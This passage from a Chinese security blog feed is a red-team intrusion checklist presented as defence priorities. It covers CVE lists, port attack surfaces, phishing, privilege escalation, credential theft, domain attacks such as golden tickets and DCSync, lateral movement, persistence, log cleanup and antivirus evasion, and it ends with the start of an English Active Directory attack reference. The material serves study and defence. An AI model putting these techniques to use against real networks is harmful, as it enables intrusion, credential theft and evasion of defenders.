利用前提是需要先得有任意一个邮箱用户权限 ]\n....\n\n</code></pre>\n<ul>\n<li>Zimbra [ XXE + SSRF =&gt; RCE ]</li>\n</ul>\n<pre><code>CVE-2013-7091\nCVE-2016-9924\nCVE-2019-9670\n\n</code></pre>\n<ul>\n<li>Citrix</li>\n</ul>\n<pre><code>CVE-2019-19781\n\n</code></pre>\n<ul>\n<li>Jumpserver</li>\n</ul>\n<pre><code>身份验证绕过\n\n</code></pre>\n<ul>\n<li>Zabbix</li>\n</ul>\n<pre><code>CVE-2017-2824\nSQL注入 [ 2.0 老版本 ]\n控制台弱口令,敏感机器信息泄露\n\n</code></pre>\n<ul>\n<li>Cacti</li>\n</ul>\n<pre><code>低版本 SQL注入\n控制台弱口令\n\n</code></pre>\n<ul>\n<li>Nagios</li>\n</ul>\n<pre><code>CVE-2016-9565\n控制台弱口令\n\n</code></pre>\n<ul>\n<li>Webmin RCE</li>\n</ul>\n<pre><code>CVE-2019-15107 \n\n</code></pre>\n<ul>\n<li>PHPMailer</li>\n</ul>\n<pre><code>CVE-2016-10033\n\n</code></pre>\n<ul>\n<li>泛微 OA 远程代码执行</li>\n<li>金蝶 OA SQL 注入</li>\n<li>Coremail 敏感文件泄露</li>\n<li>UEditor 任意文件上传</li>\n<li>OpenSSL 心脏滴血抓明文账号密码  [Heartbleed]</li>\n<li>破壳漏洞 [Shellshock]</li>\n</ul>\n<h2 id=\"各种能快速getshell的常规基础web漏洞利用-注-有些漏洞在不审代码的情况下其实是很难有效盲测到的\"><a class=\"anchor\" href=\"#各种能快速getshell的常规基础web漏洞利用-注-有些漏洞在不审代码的情况下其实是很难有效盲测到的\">#</a> 各种能快速 getshell 的常规基础 Web 漏洞利用 [注：有些漏洞在不审代码的情况下其实是很难有效盲测到的]</h2>\n<pre><code>后台弱口令\nSSRF\nsql注入\n越权\n命令 / 代码执行 / 反序列化\n任意文件上传 / 下载 / 读取\n包含\nXSS（实际上,XSS只有在针对某些特定邮箱,手里有浏览器0day时价值才会比较大,红队场景下其实并不是非常致命)\n业务逻辑漏洞\n\n</code></pre>\n<h2 id=\"针对各类边界网络设备的各种利用主要是web管理控制台登录弱口令-及-各类已知nday攻击利用\"><a class=\"anchor\" href=\"#针对各类边界网络设备的各种利用主要是web管理控制台登录弱口令-及-各类已知nday攻击利用\">#</a> 针对各类边界网络设备的各种利用，主要是 Web 管理控制台登录弱口令 及 各类已知 nday 攻击利用</h2>\n<ul>\n<li>Pulse Secure VPN</li>\n</ul>\n<pre><code>CVE-2019-11510 [ 任意文件读取 ]\n\n</code></pre>\n<ul>\n<li>Fortinet VPN</li>\n</ul>\n<pre><code>CVE-2018-13379 [ 文件读取 ]\n\n</code></pre>\n<ul>\n<li>Sangfor Vpn RCE</li>\n</ul>\n<h2 id=\"0x03-入口权限获取-专门针对各类基础服务端口的各种getshell利用防御重点-重中之重\"><a class=\"anchor\" href=\"#0x03-入口权限获取-专门针对各类基础服务端口的各种getshell利用防御重点-重中之重\">#</a> 0x03 入口权限获取 [专门针对各类基础服务端口的各种 getshell 利用，防御重点 ( &quot;重中之重&quot;) ]</h2>\n<pre><code>此处仅仅只挑选了一些实战中真正能协助快速getshell的服务,其它的一些相对边缘性的服务均未提及 \n同样,已按 &quot;实际攻击利用的难易程度&quot; 及 &quot;获取到的shell权限高低&quot; 为标准进行了详细排序\n如下,就每个端口的具体攻击利用方式,进行了简要说明\n\n</code></pre>\n<ul>\n<li>Top Port List</li>\n</ul>\n<pre><code>Mssql \t  [ 默认工作在tcp 1433端口, 弱口令, 敏感账号密码泄露, 提权, 远程执行, 后门植入 ]\nSMB       [ 默认工作在tcp 445端口, 弱口令, 远程执行, 后门植入 ]\nWMI       [ 默认工作在tcp 135端口, 弱口令, 远程执行, 后门植入 ]\nWinRM\t  [ 默认工作在tcp 5985端口, 此项主要针对某些高版本Windows, 弱口令, 远程执行, 后门植入 ]\nRDP       [ 默认工作在tcp 3389端口, 弱口令, 远程执行, 别人留的shift类后门 ]\nSSH       [ 默认工作在tcp 22端口, 弱口令, 远程执行, 后门植入 ]\nORACLE    [ 默认工作在tcp 1521端口, 弱口令, 敏感账号密码泄露, 提权, 远程执行, 后门植入 ]\nMysql     [ 默认工作在tcp 3306端口, 弱口令, 敏感账号密码泄露, 提权(只适用于部分老系统) ]\nREDIS\t  [ 默认工作在tcp 6379端口, 弱口令, 未授权访问, 写文件(webshell,启动项,计划任务), 提权 ]\nPOSTGRESQL[ 默认工作在tcp 5432端口, 弱口令, 敏感信息泄露 ]\nLDAP      [ 默认工作在tcp 389端口, 未授权访问, 弱口令, 敏感账号密码泄露 ]\nSMTP      [ 默认工作在tcp 25端口, 服务错误配置导致的用户名枚举漏洞, 弱口令, 敏感信息泄露 ]\nPOP3      [ 默认工作在tcp 110端口, 弱口令, 敏感信息泄露 ]\nIMAP      [ 默认工作在tcp 143端口, 弱口令, 敏感信息泄露 ]\nExchange  [ 默认工作在tcp 443端口, 接口弱口令爆破 eg: Owa,ews,oab,AutoDiscover... pth脱邮件, 敏感信息泄露 ... ]\nVNC       [ 默认工作在tcp 5900端口, 弱口令 ]\nFTP       [ 默认工作在tcp 21端口, 弱口令, 匿名访问/可写, 敏感信息泄露 ]\nRsync     [ 默认工作在tcp 873端口, 未授权, 弱口令, 敏感信息泄露 ]\nMongodb   [ 默认工作在tcp 27017端口, 未授权, 弱口令 ]\nTELNET    [ 默认工作在tcp 23端口, 弱口令, 后门植入 ]\nSVN       [ 默认工作在tcp 3690端口, 弱口令, 敏感信息泄露 ]\nJAVA RMI  [ 默认工作在tcp 1099端口, 可能存在反序列化利用 ]\nCouchDB   [ 默认工作在tcp 5984端口, 未授权访问 ]\n\n</code></pre>\n<h2 id=\"0x04-入口权限获取\"><a class=\"anchor\" href=\"#0x04-入口权限获取\">#</a> 0x04 入口权限获取</h2>\n<h2 id=\"传统钓鱼攻击利用实际护网场景中用的非常频繁细节非常多此处不一一列举防御重点\"><a class=\"anchor\" href=\"#传统钓鱼攻击利用实际护网场景中用的非常频繁细节非常多此处不一一列举防御重点\">#</a> 传统钓鱼攻击利用，实际护网场景中用的非常频繁，细节非常多，此处不一一列举，防御重点</h2>\n<ul>\n<li>发信前期准备</li>\n</ul>\n<pre><code>枚举有效的目标邮箱用户名列表\n批量探测目标邮箱弱口令\n伪造发信人 [ 发信邮服搭建 ]\n钓鱼信 [ 针对不同行业一般也都会事先准备好各种各样的针对性的发信话术模板,以此来提到实际发信成功率 ]\n......\n\n</code></pre>\n<ul>\n<li>典型投递方式</li>\n</ul>\n<pre><code>第一种,直接给目标发送各种常规木马信 \n\n传统宏利用\n捆绑\nexe[zip,7z]\nlnk\nchm\n自解压\n木马链接\nOLE\nCVE-2017-11882 [ 利用漏洞触发 ]\n...\n\n</code></pre>\n<pre><code>第二种,给目标发送各种钓鱼链接,比如, 利用各种目标登录口的钓鱼页面来窃取各种内网账号密码 \n\nVpn\nMail\nOA\nNet ntlm hash [ 远程模板注入,pdf...钓hash,国内ISP过滤SMB流量不适用 ]\n......\n\n</code></pre>\n<h2 id=\"0x05-主机安全-提权利用防御重点\"><a class=\"anchor\" href=\"#0x05-主机安全-提权利用防御重点\">#</a> 0x05 主机安全 [提权利用，防御重点]</h2>\n<pre><code>以下只单独挑了一些在 通用性, 稳定性, 易用性, 实际成功率 都相对较好的洞 和 方式 其它的一些&quot;边缘性&quot;的利用都暂未提及\n\n</code></pre>\n<ul>\n<li>Windows 系统漏洞 本地提权 [成功的前提是，保证事先已做好各种针对性免杀]</li>\n</ul>\n<pre><code>BypassUAC [ win7 / 8  / 8.1 / 10 ]\nMS14-058[KB3000061]\t\t\t\t    [重点]\nMS14-068[KB3011780]\t\t\t\t    [重点]\nms15-051[KB3045171]\t\t\t\t    [重点]\nMS15-077[KB3077657]\t\t\t\t    [重点]\nMS16-032[KB3124280]\t\t\t\t    [重点]\nms16-075\t\t\t\t\t    [重点]\nMS16-135[KB3199135]\t\t\t\t    [重点]\nMS17-010[KB4013389]\t\t\t\t    [重点]\ncve-2019-0708\t\t\t\t\t    [重点]\nCVE-2019-0803\t\t\t\t\t    [重点]\nCVE-2019-1322 &amp; CVE-2019-1405\t\t\t    [重点]\ncve-2019-12750 [ 赛门铁克(用的较多)本地提权 ]\t    [重点]\t\t\n\n</code></pre>\n<ul>\n<li>linux 内核漏洞 本地提权 [linux-exploit-suggester]</li>\n</ul>\n<pre><code>CVE-2016-5195\t\t\t\t\t    [重点]\nCVE-2017-16995\nCVE-2019-13272\n\n</code></pre>\n<ul>\n<li>利用各类第三方服务 / 软件工具提权</li>\n</ul>\n<pre><code>Mssql \t\t\t\t\t\t    [重点]\nOracle         \t\t\t\t\t    [重点]\nMysql\n各类第三方软件dll劫持 \t\t\t\t    [重点]\nsuid权限                        \n计划任务\n各种错误服务配置利用\n\n</code></pre>\n<h2 id=\"0x06-内网安全-敏感信息搜集防御重点可在此项严格限制各种系统内置命令执行\"><a class=\"anchor\" href=\"#0x06-内网安全-敏感信息搜集防御重点可在此项严格限制各种系统内置命令执行\">#</a> 0x06 内网安全 [敏感信息搜集，防御重点，可在此项严格限制各种系统内置命令执行]</h2>\n<ul>\n<li>搜集当前已控 &quot;跳板机&quot; 的各类敏感信息</li>\n</ul>\n<pre><code>注: 如下某些操作肯定是需要事先自己想办法先拿到管理权限后才能正常进行的,此处不再赘述\n\n查看当前shell权限 及 详细系统内核版本\n获取当前系统的 详细ip配置,包括 所在域, ip, 掩码, 网关, 主备 dns ip\n获取当前系统最近的用户登录记录\n获取当前用户的所有命令历史记录 [ 主要针对linux,里面可能包含的有各类敏感账号密码,ip,敏感服务配置... ]\n获取本机所有 服务/进程 [包括各个进程的详细权限,也包括目标系统中的可疑恶意进程(有可能是同行的马)]/端口/网络连接信息\n获取本机所用杀软 / 监控种类 [ 后续好针对性的做免杀 ]\n获取本机 rdp / ssh 端口开启状态 及 其默认端口号\n获取本机所有用户的rdp外连记录\n获取本机的所有SSH登录记录\n获取当前系统所有登录成功的日志 [ 针对windows ]\n获取本机所有已安装软件的详细列表 [ 主要为抓密码,提权,留后门做准备 ]\n获取本机各个浏览器中保存的 所有书签页 及 历史浏览记录\n获取当前用户创建的所有计划任务列表 及 计划任务所对应的执行脚本内容 [ 有些执行脚本中很可能存的有各种连接账号密码 ]\n获取当前用户 桌面 及 回收站 里的所有文件列表\n获取当前系统的所有存在suid权限的二进制程序\n获取当前系统代理 [ ip &amp; 端口 ]\n获取当前系统所有的自启动注册表项值\n获取当前系统的所有 ipc 连接 及 已启用共享\n获取当前系统的所有挂载[mount]\n获取当前系统的防火墙状态\n获取当前系统所有分区/盘符及其详细使用情况\n获取本机的累计开机时长\n获取本机arp / dns缓存\n获取当前机器环境变量 [ 主要想看看目标机器上有无python,jdk,ruby...等语言的执行环境,后期可设法利用 ]\n获取当前系统所有本地用户及组列表\n获取当前系统host文件内容\n获取当前机器硬件设备信息[ 主要为判断当前机器是否为虚拟机 ]\n远程截屏捕捉目标用户敏感操作\n\n由于上述大部分的搜集动作都是基于系统内置工具和接口,故,可完全依靠EDR来实时捕捉各类敏感进程上报恶意操作\n\n</code></pre>\n<ul>\n<li>利用当前已控 &quot;跳板机&quot;, 分析目标内网大致网络拓扑 及 所有关键性业务机器分布</li>\n<li>批量抓取内网所有 windows 机器名 和 所在 &quot;域&quot; / &quot;工作组名&quot; [smb 探测扫描]</li>\n<li>针对内网的各种高危敏感服务定位 [&quot;安全&quot; 端口扫描 (在避免对方防护报警拦截的情况下进行各种常规服务探测识别)]</li>\n<li>内网批量 Web Banner 抓取，获取关键目标业务系统如下</li>\n</ul>\n<pre><code>内网各种文件[共享]服务器\n内网各类web服务器  [ 可用于后期留入口 ]\n内网各类数据库服务器\n内网邮件服务器  [ 可用于后期留入口 ]\n内网Vpn服务器  [ 可用于后期留入口 ]\n内网各类常规资产状态监控服务器,eg: zabbix,nagios,cacti...\n内网各类防护的主控端,比如,防火墙,EDR,态势感知 产品的web主控端...\n内网日志服务器\n内网补丁服务器\n内网各类OA,ERP,CRM,SRM,HR系统... \n内网打印服务器\n内网 MES 系统 \n内网虚拟化服务器 / 超融合平台 [Vmware ESX]\n内网堡垒机...\n内网运维,研发 部门员工的机器\n内网路由,交换设备...\n等等等...\n\n针对以上的各种常规内网探测扫描,其实在流量上都会有非常清晰的表现\n通过在一些关键节点设备/服务器上部署探针搜集流量\n再配合大数据关联分析查找各种敏感特征,理论上是相对容易发现各类扫描探测痕迹的\n\n</code></pre>\n<ul>\n<li>针对各类已知系统高危 RCE 漏洞的批量探测识别与利用</li>\n</ul>\n<pre><code>MS08-067 [ 其实,某些特殊行业的系统可能非常老,极少更新,故,还是有存在的可能 ]\nMS17-010\nCVE-2019-0708\n\n其实针对此类漏洞的攻击利用识别,就显得比较直白了\n通过深入分析每种漏洞在实际攻击利用过程所产生的一些典型 流量特征 和 系统日志即可大致判断\n\n</code></pre>\n<h2 id=\"0x07-内网安全-各类敏感凭证-搜集-与-窃取\"><a class=\"anchor\" href=\"#0x07-内网安全-各类敏感凭证-搜集-与-窃取\">#</a> 0x07 内网安全  [各类敏感凭证 &quot;搜集&quot; 与 &quot;窃取&quot;]</h2>\n<ul>\n<li>主动密码搜集</li>\n</ul>\n<pre><code>注:如下某些操作肯定是需要事先自己想办法先拿到管理权限或者在指定用户权限下才能正常进行的\n此处不再赘述, 此项非防御重点, 因为压根也不好防\n\n批量抓取当前机器上的 &quot;各类基础服务配置文件中保存的各种账号密码&quot;\n   比如,各种数据库连接配置文件,各类服务自身的配置文件(redis,http basic...)...\n想办法 &quot;控制目标 运维管理 / 技术人员 的单机,从这些机器上去搜集可能保存着各类敏感网络资产的账号密码表&quot;\n   比如, *.ls,*.doc,*.docx, *.txt....\n抓取各类 &quot;数据库客户端工具中保存各种数据库连接账号密码\n   比如,Navicat,SSMS[MSSQL自带客户端管理工具,里面也可能保存的有密码(加密后的base64)]\n\n抓取当前系统 &quot;注册表中保存的各类账号密码hash&quot; [ Windows ]\n抓取当前系统所有 &quot;本地用户的明文密码/hash&quot; [ Windows &amp; linux ]\n抓取当前系统的所有 &quot;用户token&quot; [ Windows ]\n抓取 &quot;windows凭据管理器中保存的各类连接账号密码&quot;\n抓取 &quot;MSTSC 客户端中保存的所有rdp连接账号密码&quot;\n抓取各类 &quot;VNC客户端工具中保存的连接密码&quot;\n抓取 &quot;GPP目录下保存的各类账号密码&quot; [ 包括组策略目录中XML里保存的密码hash 和 NETLOGON目录下的某些脚本中保存的账号密码 ]\n抓取各类 &quot;SSH客户端工具中保存的各种linux系统连接账号密码&quot;, SecureCRT,Xshell,WinSCP,putty\n抓取各类 &quot;浏览器中保存的各种web登录密码&quot;,Chrome [360浏览器],Firefox,IE,QQ浏览器\n抓取各类 &quot;数据库表中保存的各类账号密码hash&quot;\n抓取各类 &quot;FTP客户端工具中保存的各种ftp登录账号密码&quot;, filezila, xftp...\n抓取各类 &quot;邮件客户端工具中保存的各种邮箱账号密码&quot;, forxmail, thunderbird...\n抓取各类 &quot;SVN客户端工具中保存的所有连接账号密码及项目地址&quot;\n抓取各类 &quot;VPN客户端工具中保存的各种vpn链接账号密码&quot;\n\n\n</code></pre>\n<ul>\n<li>被动密码搜集 [等着管理员自己来送密码]</li>\n</ul>\n<pre><code>[注: 某些操作肯定是需要事先自己想办法先拿到管理权限后才能正常进行的, 此处不再赘述 , 是防御重点]\n\nWindows SSP [持久化/内存]\nHook PasswordChangeNotify [持久化/内存]\nOWA 登录账号密码截获\n截获mstsc.exe中输入的rdp连接账号密码\nlinux 别名记录利用\n本机明文密码嗅探 [ http,ftp,pop3... ]\n传统键盘记录\nwindows蓝屏技巧 [ 此操作主要为应对不时之需,比如,搞蓝屏,登管理员登录抓密码 ]\n\n</code></pre>\n<ul>\n<li>Hash 爆破:</li>\n</ul>\n<pre><code>Hashcat [ 完全拼GPU ] \n\n</code></pre>\n<h2 id=\"0x08-内网安全-内网常用-隧道-转发-代理-穿透手法-提炼汇总-防御重点\"><a class=\"anchor\" href=\"#0x08-内网安全-内网常用-隧道-转发-代理-穿透手法-提炼汇总-防御重点\">#</a> 0x08 内网安全 [内网常用 &quot;隧道&quot;&quot; / &quot;转发&quot;&quot; / &quot;代理&quot;&quot; 穿透手法 提炼汇总 ，防御重点]</h2>\n<pre><code>出网流量刺探\n比如,http,dns,以及一些穿透性相对较好的tcp端口... \n这种操作一般都会配合wmi,smb,ssh远程执行,在内网批量快速识别出能出网的机器\n\n常规 HTTP脚本代理\nabptts,Neo-reGeorg,reGeorg,tunna,reduh...\n不得不说,公开脚本在实战中多多少少都会有些问题,还需要根据自己的实际目标环境深度改进才行\n\nSSH 隧道\n加密端口转发,socks 实战用途非常灵活,此处不细说 ]\n\nRdp 隧道\n\n反向SOCKS\nnps, frp, ssf, CobaltStrike(socks4a &amp; rportfwd ), sscoks ... \n工具基本都不免杀了,需要自行处理\n\n正反向TCP 端口转发\n非常多,就不一一列举, eg: nginx,netsh,socat,ew....\n\nDNS加密隧道\t\t\t\n\nWeb端口复用\n\n需要明白的是,在一般的红队场景中\n入侵者为了尽可能躲避各种检测设备的流量解析,很多此类工具都会采用各种各样的方式来加密传输流量,以此来保证自己有更强的穿透性\n\n</code></pre>\n<h2 id=\"0x09-域内网安全-域内常用攻击手法-域渗透-提炼汇总防御重点\"><a class=\"anchor\" href=\"#0x09-域内网安全-域内常用攻击手法-域渗透-提炼汇总防御重点\">#</a> 0x09 域内网安全 [域内常用攻击手法 ( 域渗透)，提炼汇总，防御重点 ]</h2>\n<ul>\n<li>针对当前域的一些常规信息搜集 [其实现实中，只需要一个 BloodHound &amp; Pingcastle 足矣，就是工具需要自行事先免杀好]</li>\n</ul>\n<pre><code>获取当前域内的完整域管列表\n获取当前域内的所有域控机器名列表\n获取当前域内的所有DNS服务器机器名列表\n获取当前域内的所有SPN\n获取当前域内的所有OU\n获取当前域内的所有用户 &amp; 用户组列表\n获取当前域信任关系 [ 跨域渗透 ]\n获取当前域内所有机器的开机时间\n获取当前域内网段及web站点\n获取当前域内策略 [ 主要是为了了解密码策略 ]\n获取当前域林\n.......\n\n</code></pre>\n<ul>\n<li>快速获取目标域控权限的一些常规手法</li>\n</ul>\n<pre><code>搜集GPP 目录 [ 其中可能保存的有域账号密码,不仅仅是存在XML里的那些,NETLOGON目录中的某些脚本同样也可能保存有账号密码 ] \n服务票据hash破解(&quot;尤其是域管用户的&quot;) [ kerberoast ]\n批量对域用户进行单密码尝试 [ 喷射,利用ADSI接口,日志id 4771 ]\nKerberos 委派利用\n爆破LDAP\nExchange特定ACL滥用\nSSP 截获关键服务器登录密码\n利用各类基础服务在内网快速 getshell [ 弱口令, 各类JAVA中间件已知Nday漏洞, 常规Web漏洞... ],在内网循环抓各类密码,直至\n  抓到域管密码\n  抓到域管令牌\nDNSAdmin 组成员滥用 [ 加载执行恶意dll ]\nLAPS\nMS14-068 [ 如今实际中已很少遇到了 ]\nLLMNR/NBNS欺骗  + SMB relay [ 真实在实战中其实用的并不多 ]\n\n</code></pre>\n<ul>\n<li>域内后渗透敏感信息搜集分析</li>\n</ul>\n<pre><code>获取所有DNS记录\n导出当前域的完整LDAP数据库\n提取当前域的ntds.dit [ 域内账号密码数据库 ]\n  Dcsync同步\n  Volume Shadow Copy Service\n\n</code></pre>\n<ul>\n<li>域内指定用户登录 ip 定位</li>\n</ul>\n<pre><code>利用OWA登录日志\n利用域控服务器登录日志\n指定服务银票 [ Silver Ticket ]\n除此之外,就是下面的各类常规横向手法\n\n</code></pre>\n<ul>\n<li>域内指定用户机器定向控制技巧</li>\n</ul>\n<pre><code>绑定用户登录脚本\n利用GPO下发 [实际上,利用GPO能做的事情还非常非常多]\nPTT [ 票据传递 ]\n\n</code></pre>\n<ul>\n<li>针对域管的各种权限维持技巧</li>\n</ul>\n<pre><code>金票\nSkeleton Key\nDSRM密码同步\nOWA后门\n...\n\n</code></pre>\n<ul>\n<li>域内 Exchange 邮件数据脱取</li>\n</ul>\n<pre><code>利用Ews接口通过PTH的方式脱邮件\n\n</code></pre>\n<h2 id=\"0x10-内网安全-跨平台横向渗透-远程执行防御重点-重中之重\"><a class=\"anchor\" href=\"#0x10-内网安全-跨平台横向渗透-远程执行防御重点-重中之重\">#</a> 0x10 内网安全 [跨平台横向渗透 (远程执行)，防御重点 ( &quot;重中之重&quot; ) ]</h2>\n<ul>\n<li>从 Windows 平台 横向至  Windows 平台</li>\n</ul>\n<pre><code>注: 以下某些远程执行方式, 即可直接用明文账号密码 亦可 基于pth来进行, 不局限\n\n远程服务管理 [ SCM ]\n远程创建执行计划任务 [ Scheduled Tasks ]\nWMI 远程执行 [ WMI ]\n针对高版本Windows 的WinRM 远程执行 \nDCOM 远程执行 [ 需要目标Windows机器事先已关闭防火墙 ]\n高版本 RDP 远程执行\n利用MSSQL数据库存储过程来变相远程执行\n利用Oracle数据库存储过程来变相远程执行\nSMB [ PTH (hash传递) ]\nRDP[MSTSC] 反向渗透 [ 即可用于突破某些隔离, 亦可通过云(Windows vps)直接反控目标管理员个人机 CVE-2019-0887 ]\n利用补丁服务器下发执行\n利用EDR主控端定向下发执行\n\n</code></pre>\n<ul>\n<li>从 Windows 平台 横向至 *inux 平台</li>\n</ul>\n<pre><code>plink 或者 基于Windows SSH库自行开发各种远程执行小工具\n\n</code></pre>\n<ul>\n<li>从 *inux 平台 横向至 Windows 平台</li>\n</ul>\n<pre><code>一般都会将 impacket套件中的各个常用py脚本事先直接打包成可执行文件, 然后丢到目标linux系统中去执行,如下\nwmiexec_linux_x86_64\nsmbexec_linux_x86_64\npsexec_linux_x86_64\natexec_linux_x86_64\ndcomexec_linux_x86_64\n\n另外,还有一些基于go的工具,同样也可以编译成可执行文件之后再丢上去执行\n\n</code></pre>\n<ul>\n<li>从 *inux 平台 横向至 *inux 平台</li>\n</ul>\n<pre><code>linux 自带的ssh客户端工具套件, 默认就可以用来进行远程执行\n\n</code></pre>\n<ul>\n<li>各种远程下载技巧</li>\n</ul>\n<pre><code>wget [ win &amp; linux ]\ncurl [ win &amp; linux ]\n\n</code></pre>\n<pre><code>之所以没着重提以下这些系统内置的远程下载执行工具,主要还是因为事先已经明确知道\n某些杀软环境下它肯定会被拦截,所以事先就直接把它弃用了,尤其针对红队这种场景,这些东西根本不在乎多,有一个能用好用的即可\n\nCertUtil.exe\nBitsadmin.exe\nRegsvr32.exe\nRundll32.exe\nPowershell.exe\n......\n\n</code></pre>\n<h2 id=\"0x11-内网安全-权限维持防御重点-注-有些细节此处并未展开详细说明\"><a class=\"anchor\" href=\"#0x11-内网安全-权限维持防御重点-注-有些细节此处并未展开详细说明\">#</a> 0x11 内网安全 [权限维持，防御重点] [ 注：有些细节此处并未展开详细说明 ]</h2>\n<ul>\n<li>边界入口权限维持</li>\n</ul>\n<pre><code>OWA 登录口 [ 账号密码,webshell ]\nVPN 登录口 [ 账号密码,shell ]\n其他 MAIL 登录口 [ 账号密码 ]\n边界 Web服务器 [ Webshell 驻留技巧 ]\n边界路由交换设备 [ 账号密码,shell ]\n...\n\n</code></pre>\n<ul>\n<li>Windows 单机系统维持 [临时]</li>\n</ul>\n<pre><code>系统计划任务 [ 高权限/低权限 ]\n常规注册表自启动项 [ 用户权限/system权限 ]\nMssql存储过程 [ 继承服务权限 ]\nWMI\nWinlogon\nCLR\nLogon Scripts\nMruPidlList\nMof\n传统远控\n...\n\n</code></pre>\n<ul>\n<li>linux 单机系统维持 [临时]</li>\n</ul>\n<pre><code>Patch SSH\n替换各类基础服务so [ PAM,Nginx,Rsync ...] \n系统计划任务\n传统应用层远控\n驱动层远控( 针对特定内核版本 )\n\n</code></pre>\n<h2 id=\"0x12-痕迹处理\"><a class=\"anchor\" href=\"#0x12-痕迹处理\">#</a> 0x12 痕迹处理</h2>\n<pre><code>web日志 [ 访问, 错误日志 ]\n数据库日志 [ 异常连接日志,慢查询日志 ]\n系统各类安全日志 [ ssh,rdp,smb,wmi,powershell....]\n各类邮箱登录日志\n域内敏感攻击利用日志 [ 金票,银票... ]\n此项为专业蓝队范畴,不再赘述\n......\n\n</code></pre>\n<h2 id=\"0x13-各类常用-c2-渗透-框架\"><a class=\"anchor\" href=\"#0x13-各类常用-c2-渗透-框架\">#</a> 0x13 各类常用 C2 / 渗透 框架</h2>\n<pre><code>CobaltStrike [二次开发]\n  payload(beacon) 逆向/改进重写\nMetasploit [二次开发]\n......\n\n</code></pre>\n<h2 id=\"0x14-各类常用-webshell管理工具\"><a class=\"anchor\" href=\"#0x14-各类常用-webshell管理工具\">#</a> 0x14 各类常用 Webshell 管理工具</h2>\n<pre><code>菜刀\tcaidao20160622\n冰蟹\tBehinder_v2.0.1\n蚁剑\tAntSword\n......\n\n</code></pre>\n<h2 id=\"0x15-免杀-及-各类防火墙对抗\"><a class=\"anchor\" href=\"#0x15-免杀-及-各类防火墙对抗\">#</a> 0x15 免杀 及 各类防火墙对抗</h2>\n<ul>\n<li>静态</li>\n</ul>\n<pre><code>混淆:\n手工混淆,有源码的情况下,尝试逐个替换可能是关键特征字符串的 命名空间名, 函数名, 变量名, 字符串 等等等....\n工具混淆,针对各种语言的专业混淆工具 [ 有商业版 ]\n...\n\n加壳:\n一些常用公开壳的实际效果可能并不是太好 [ 也有商业壳 ]\n最好的方式还是尝试自己写壳,就是成本较高\n...\n\n</code></pre>\n<ul>\n<li>动态</li>\n</ul>\n<pre><code>反射\nshellcode 内存加解密执行 ( 对于现在的某些杀软来讲,可能并没什么卵用,别人拦的基本都是你的最终调用 )\n白利用\n......\n\n注:\n   理论上, 这些应该也没有什么非常通用的方法\n   大多还是事先针对特定的杀软针对性的不停调试分析出它到底怎么拦,怎么查的,然后再针对性的对症下药\n\n</code></pre>\n<ul>\n<li>流量:</li>\n</ul>\n<pre><code>域前置[利用大厂cdn]\nDNS加密隧道\n第三方公共邮箱上线\n第三方网盘上线\n第三方社交网站上线\n第三方匿名社交工具上线[eg: tg机器人,tor...]\n\n</code></pre>\n",
            "tags": [
                "网络安全",
                "RedTeam"
            ]
        },
        {
            "id": "https://self-ferry.github.io/2021/01/18/AD-Attack-Defense/",
            "url": "https://self-ferry.github.io/2021/01/18/AD-Attack-Defense/",
            "title": "Active Directory Kill Chain Attack & Defense【转】",
            "date_published": "2021-01-18T07:08:48.000Z",
            "content_html": "<h1 id=\"active-directory-kill-chain-attack-defense\"><a class=\"anchor\" href=\"#active-directory-kill-chain-attack-defense\">#</a> Active Directory Kill Chain Attack &amp; Defense</h1>\n<img width=\"650\" data-src=\"https://camo.githubusercontent.com/9547d8152e3490a6e5e3da0279faab64340885be/68747470733a2f2f646f63732e6d6963726f736f66742e636f6d2f656e2d75732f616476616e6365642d7468726561742d616e616c79746963732f6d656469612f61747461636b2d6b696c6c2d636861696e2d736d616c6c2e6a7067\">\n<h2 id=\"summary\"><a class=\"anchor\" href=\"#summary\">#</a> Summary</h2>\n<p>This document was designed to be a useful, informational asset for those looking to understand the specific tactics, techniques, and procedures (TTPs) attackers are leveraging to compromise active directory and guidance to mitigation, detection, and prevention. And understand Active Directory Kill Chain Attack and Modern Post Exploitation Adversary Tradecraft Activity.</p>\n<h2 id=\"table-of-contents\"><a class=\"anchor\" href=\"#table-of-contents\">#</a> Table of Contents</h2>\n<ul>\n<li><a href=\"#discovery\">Discovery</a></li>\n<li><a href=\"#privilege-escalation\">Privilege Escalation</a></li>\n<li><a href=\"#defense-evasion\">Defense Evasion</a></li>\n<li><a href=\"#credential-dumping\">Credential Dumping</a></li>\n<li><a href=\"#lateral-movement\">Lateral Movement</a></li>\n<li><a href=\"#persistence\">Persistence</a></li>\n<li><a href=\"#defense-&amp;-detection\">Defense &amp; Detection</a></li>\n</ul>\n<hr />\n<h2 id=\"discovery\"><a class=\"anchor\" href=\"#discovery\">#</a> Discovery</h2>\n<h3 id=\"spn-scanning\"><a class=\"anchor\" href=\"#spn-scanning\">#</a> SPN Scanning</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9hZHNlY3VyaXR5Lm9yZy8/cD0xNTA4\">SPN Scanning – Service Discovery without Network Port Scanning</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9zb2NpYWwudGVjaG5ldC5taWNyb3NvZnQuY29tL3dpa2kvY29udGVudHMvYXJ0aWNsZXMvMTg5OTYuYWN0aXZlLWRpcmVjdG9yeS1wb3dlcnNoZWxsLXNjcmlwdC10by1saXN0LWFsbC1zcG5zLXVzZWQuYXNweA==\">Active Directory: PowerShell script to list all SPNs used</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLnN0ZWFsdGhiaXRzLmNvbS9kaXNjb3ZlcmluZy1zZXJ2aWNlLWFjY291bnRzLXdpdGhvdXQtdXNpbmctcHJpdmlsZWdlcy8=\">Discovering Service Accounts Without Using Privileges</span></li>\n</ul>\n<h3 id=\"data-mining\"><a class=\"anchor\" href=\"#data-mining\">#</a> Data Mining</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly90aGV2aXZpLm5ldC8yMDE4LzA1LzIzL2EtZGF0YS1odW50aW5nLW92ZXJ2aWV3Lw==\">A Data Hunting Overview</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuaGFybWoweS5uZXQvYmxvZy9yZWR0ZWFtaW5nL3B1c2gtaXQtcHVzaC1pdC1yZWFsLWdvb2Qv\">Push it, Push it Real Good</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLm5ldHNwaS5jb20vZmluZGluZy1zZW5zaXRpdmUtZGF0YS1kb21haW4tc3FsLXNlcnZlcnMtdXNpbmctcG93ZXJ1cHNxbC8=\">Finding Sensitive Data on 